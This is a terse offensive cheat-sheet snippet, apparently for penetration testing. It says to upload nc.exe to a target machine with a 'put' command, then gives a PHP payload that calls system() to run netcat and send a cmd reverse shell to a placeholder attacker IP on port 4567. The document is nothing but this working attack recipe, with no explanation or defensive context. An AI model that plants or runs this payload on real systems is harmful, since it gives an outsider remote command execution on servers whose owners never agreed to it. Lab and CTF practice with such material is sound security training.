# Make sure that nc.exe is already uploaded at target machine

```
put nc.exe
```

```
<?php
system('nc.exe YOUR_IP 4567 -e cmd')
?>
```
